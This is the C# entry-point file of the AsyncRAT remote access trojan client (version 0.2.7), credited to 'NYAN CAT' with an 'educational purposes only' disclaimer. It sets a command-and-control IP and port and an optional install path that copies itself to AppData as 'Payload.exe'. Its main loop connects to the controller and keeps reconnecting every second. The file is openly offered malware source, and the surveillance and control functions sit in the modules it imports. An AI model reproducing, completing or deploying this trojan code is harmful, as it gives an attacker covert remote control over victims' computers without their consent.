using System.Threading;
using Client.Sockets;
using System.IO;
using System;
using Client.Install;

//       │ Author     : NYAN CAT
//       │ Name       : AsyncRAT // Simple Socket

//       Contact Me   : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.


namespace Client
{
    class Settings
    {
        public static readonly string IP = "127.0.0.1";
        public static readonly string Port = "6606";
        public static readonly string Version = "AsyncRAT 0.2.7";
        public static readonly string Install = "false";
        public static readonly string ClientFullPath = Path.Combine(Environment.ExpandEnvironmentVariables("%AppData%"), "Payload.exe");
    }

    class Program
    {


        static void Main()
        {
            if (Settings.Install == "true")
                NormalStartup.Install();

            ClientSocket.InitializeClient();

            while (true)
            {
                if (ClientSocket.Connected == false)
                    ClientSocket.Reconnect();
                Thread.Sleep(1000);
            }
        }
    }
}